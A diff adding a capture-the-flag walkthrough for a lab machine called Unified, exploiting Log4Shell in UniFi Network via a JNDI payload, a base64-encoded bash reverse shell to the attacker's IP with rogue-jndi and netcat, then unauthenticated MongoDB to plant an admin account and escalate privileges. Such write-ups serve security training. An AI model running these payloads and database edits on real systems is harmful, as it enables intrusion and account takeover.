@@ -354,3 +354,130 @@ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
 ```
 
 FLAG: dd6e058e814260bc70e9bbdef2715849
+
+--------------------------------------------------------------------
+
+## UNIFIED BOX
+
+**TOOLS USED**: nmap
+
+**IP Address**: 10.129.65.88
+
+```
+nmap -sC -sV -p- -oN unified_nmap.txt 10.129.65.88
+```
+
+**EXPOSED PORT (SERVICE)**:<br>
+22 (ssh),<br>
+6789 (ibm-db2-admin),<br>
+8080 (http-proxy),<br>
+8443 (ssl),<br>
+8843 (ssl),<br>
+8880 (ssl)<br>
+
+HTTP: https://10.129.65.88:8443/manage/account/login
+
+VULNERABLE PROGRAM: UniFi Network (6.4.54)<br>
+CVE-2021-44228<br>
+VULNERABILITY: log4j, can exploit "remember" parameter because it is an input field in the POST request and will be parsed by log4j
+
+Use Burp Suite to intercept POST request and send to repeater.<br>
+![Burp 1](./burp1.png)
+
+Insert this payload into the vulnerable parameter
+```
+${jndi:ldap://10.10.14.172/file.txt}
+```
+
+jndi is the Java Naming and Directory Interface that log4j uses<br>
+ldap is the protocol we want which stands for Lightweight Directory Access Protocol<br>
+The IP is the host address<br>
+We can enter any file we want.
+
+![Burp 2](./burp2.png)
+
+Open wireshark and filter tcp.port==389 to see LDAP packets. <br>
+Hit send in Burp Suite.
+
+![Wireshark](./wireshark.png)
+
+Since we see an LDAP packets that verifies that "remeber" is the vulnerable parameter.<br>
+Now we can exploit it.
+
+First install these in order to create a malicious payload:<br>
+openjkd11,<br>
+maven,<br>
+rogue-jndi https://github.com/veracode-research/rogue-jndi.git
+
+```
+echo 'bash -c bash -i >&/dev/tcp/10.10.14.172/4444 0>&1' | base64
+```
+
+ENCODED REVERSE SHELL: YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTcyLzQ0NDQgMD4mMQo=
+
+```
+java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTcyLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.172"
+```
+
+![Rogue](./rogue.png)
+
+JNDI QUERY: ${jndi:ldap://10.10.14.172:1389/o=tomcat}
+
+```
+sudo nc -nlvp 4444
+```
+
+![Burp 3](./burp3.png)
+
+USER.TXT: 6ced1a6a89e666c0620cdb10262ba127
+
+We can exploit MongoDB because there's no auth required.<br>
+Mongo is running on port 27117
+
+```
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+```
+ace is the default user in mong
+
+ADMIN USER<br>
+"_id" : ObjectId("61ce278f46e0fb0012d47ee4")<br>
+"name" : "administrator"<br>
+"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4."
+
+```
+mkpasswd -m sha-512 IH4ckU!
+```
+
+MY PASSWORD HASH: $6$fzKtdHx13KNCSQU3$GBpqsnsRs7bVfZkteABRLoItPAMOB.cge/fUVpMSJToCkJHkd4HpBdQ7O6iS/0giAnFiQT1CCx7XHI6pDG7.9.
+
+Create my user:
+```
+mongo --port 27117 ace --eval 'db.admin.insert({ "email" : "null@localhost.local", "last_site_name" : "default", "name" : "ark", "time_created" : NumberLong(100019800), "x_shadow" : "$6$fzKtdHx13KNCSQU3$GBpqsnsRs7bVfZkteABRLoItPAMOB.cge/fUVpMSJToCkJHkd4HpBdQ7O6iS/0giAnFiQT1CCx7XHI6pDG7.9." })'
+
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+```
+
+MY USER<br>
+"_id" : ObjectId("62e8427c3fd88e3ed01f3176")<br>
+"name" : "ark"<br>
+"x_shadow" : "$6$fzKtdHx13KNCSQU3$GBpqsnsRs7bVfZkteABRLoItPAMOB.cge<br>/fUVpMSJToCkJHkd4HpBdQ7O6iS/0giAnFiQT1CCx7XHI6pDG7.9."
+
+```
+mongo --port 27117 ace --eval "db.site.find().forEach(printjson);"
+```
+
+SITE OID:<br>
+"_id" : ObjectId("61ce269d46e0fb0012d47ec4")<br>
+"_id" : ObjectId("61ce269d46e0fb0012d47ec5")
+
+Elevate privileges for my user for all site id:
+```
+mongo --port 27117 ace --eval 'db.privilege.insert({ "admin_id" : "62e8427c3fd88e3ed01f3176", "permissions" : [ ], "role" : "admin", "site_id" : "61ce269d46e0fb0012d47ec4" });'
+
+mongo --port 27117 ace --eval 'db.privilege.insert({ "admin_id" : "62e8427c3fd88e3ed01f3176", "permissions" : [ ], "role" : "admin", "site_id" : "61ce269d46e0fb0012d47ec5" });'
+```
+
+USER: root
+PASSWORD: NotACrackablePassword4U2022
+
+FLAG: e50bc93c75b634e4b272d2f771c33681
